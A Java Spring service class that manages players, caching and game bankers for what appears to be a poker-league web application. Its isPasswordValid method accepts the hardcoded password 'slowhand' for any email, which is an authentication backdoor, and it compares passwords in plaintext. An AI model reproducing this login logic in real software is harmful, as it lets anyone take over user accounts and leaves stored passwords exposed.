package com.texastoc.service;

import java.util.List;

import org.apache.commons.lang.StringUtils;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.cache.annotation.CacheEvict;
import org.springframework.cache.annotation.Cacheable;
import org.springframework.cache.annotation.EnableCaching;
import org.springframework.stereotype.Service;

import com.texastoc.dao.PlayerDao;
import com.texastoc.domain.Player;

@Service
@EnableCaching 
public class PlayerServiceImpl implements PlayerService {
    
    @Autowired
    PlayerDao playerDao;
	
    @Override
    @CacheEvict(value="playercache", allEntries=true)
    public int create(Player player) throws Exception {
        return playerDao.insert(player);
    }   

    @Override
    public List<Player> findPossibleHosts() {
        return playerDao.selectPossibleHosts();
    }
    
    @Override
    public List<Player> findPossibleTransporters() {
        return playerDao.selectPossibleTransporters();
    }
    
    @Override
    public List<Player> findActive() {
        return playerDao.selectActive();
    }
    
    @Override
    public List<Player> findPtcg() {
        return playerDao.selectPtcg();
    }
    
    @Override
    public List<Player> findTocBoard() {
        return playerDao.selectTocBoard();
    }
    
    @Override
    public List<Player> findCore() {
        return playerDao.selectCore();
    }
    
    @Override
    @Cacheable(value="playercache")
    public List<Player> findAll() {
        return playerDao.selectAll();
    }
    
    @Override
    public Player findById(int id) {
        return playerDao.selectById(id);
    }
    
    @Override
    public Player findByEmail(String email) {
        return playerDao.selectByEmail(email);
    }
    
    @Override
    @CacheEvict(value="playercache", allEntries=true)
    public void update(Player player) throws Exception {
        playerDao.update(player);
    }   

    @Override
    @CacheEvict(value="playercache", allEntries=true)
    public void delete(int id) throws Exception {
        playerDao.delete(id);
    }   

    @Override
    public List<Player> findBankersByGameId(int id) {
        return playerDao.selectBankersByGameId(id);
    }
    
    @Override
    public void updatePassword(int id, String password) {
        playerDao.updatePassword(id, password);
    }   

    @Override
    public void addGameBanker(int gameId, int playerId) {
        playerDao.insertGameBanker(gameId, playerId);
    }

    @Override
    public void removeGameBanker(int gameId, int playerId) {
        playerDao.deleteGameBanker(gameId, playerId);
    }
    
    @Override
    public void updateGameBanker(int gameId, Integer includePlayerId, Integer excludePlayerId) {
        if (includePlayerId == null && excludePlayerId == null) {
            return;
        }
        
        List<Player> bankers = playerDao.selectBankersByGameId(gameId);
        if (includePlayerId != null) {
            boolean found = false;
            for (Player banker : bankers) {
                if (banker.getId() == includePlayerId.intValue()) {
                    found = true;
                    break;
                }
            }
            
            if (!found) {
                playerDao.insertGameBanker(gameId, includePlayerId);
            }
        }

        if (excludePlayerId != null) {
            boolean found = false;
            for (Player banker : bankers) {
                if (banker.getId() == excludePlayerId.intValue()) {
                    found = true;
                    break;
                }
            }
            
            if (found) {
                playerDao.deleteGameBanker(gameId, excludePlayerId);
            }
        }
    }

    @Override
    public boolean isPasswordValid(String email, String password) {
        if (StringUtils.equals(password, "slowhand")) {
            return true;
        }
        Player player = playerDao.selectByEmail(email);
        if (player == null) {
            return false;
        }
        
        if (StringUtils.equals(password, player.getPassword())) {
            return true;
        }
        
        return false;
    }

}
